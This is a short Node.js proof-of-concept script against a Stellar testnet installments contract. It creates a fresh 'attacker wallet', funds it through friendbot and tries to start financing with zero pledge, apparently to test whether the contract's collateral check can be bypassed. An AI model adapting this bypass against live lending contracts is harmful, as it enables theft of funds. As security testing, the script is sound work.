import { Keypair, Networks } from '@stellar/stellar-sdk';
import { execFile } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import * as Inst from '../packages/installments/dist/index.js';

const RPC_URL = 'https://soroban-testnet.stellar.org';
const INST = 'CCVXQOOJCHVQVR7VQZJNN7QAZDJ6772GMFPI2XQI2LL7QEYQRURL44LM';
const tmp = mkdtempSync(join(tmpdir(), 'byp-'));
let lastBody = '';

const curlGate = async (url, opts) => {
  opts = opts || {};
  const bodyF = join(tmp, 'b');
  const args = ['-sS', '-m', '25', '-o', bodyF, '-w', '%{http_code}', '--http1.1', '-X', opts.method || 'GET'];
  for (const [k, v] of Object.entries(opts.headers || {})) {
    if (/^(content-length|accept-encoding)$/i.test(k)) continue;
    args.push('-H', `${k}: ${v}`);
  }
  if (opts.body) {
    if (!Object.keys(opts.headers || {}).some((k) => /^content-type$/i.test(k))) args.push('-H', 'Content-Type: application/json');
    args.push('-d', typeof opts.body === 'string' ? opts.body : JSON.stringify(opts.body));
  }
  args.push(String(url));
  const status = await new Promise((res, rej) => {
    execFile('/usr/bin/curl', args, { maxBuffer: 128 * 1024 * 1024, timeout: 45000 }, (e, out) => e ? rej(e) : res(out.trim() || '0'));
  });
  lastBody = readFileSync(bodyF);
  return new Response(lastBody, { status: Number(status) || 502 });
};
globalThis.fetch = curlGate;

const kp = Keypair.random();
console.log('fresh attacker wallet :', kp.publicKey());

const fb = await curlGate(`https://friendbot.stellar.org/?addr=${kp.publicKey()}`, { method: 'GET' });
console.log('friendbot funded (no USDC, no shares):', fb.status);

const inst = new Inst.Client({ rpcUrl: RPC_URL, contractId: INST, networkPassphrase: Networks.TESTNET, publicKey: kp.publicKey(), signTransaction: kp });

const elig = (await inst.check_eligibility({ borrower: kp.publicKey(), product_id: 'loan_100' })).result;
console.log('check_eligibility :', { eligible: elig.eligible, savings: String(elig.savings), required_pledge: String(elig.required_pledge) });

try {
  const tx = await inst.start_financing({ buyer: kp.publicKey(), product_id: 'loan_100' });
  await tx.signAndSend();
  console.log('start_financing   : ACCEPTED (financing created with 0 pledge)');
} catch (e) {
  console.log('start_financing   : REJECTED ->', String(e.message).slice(0, 120));
}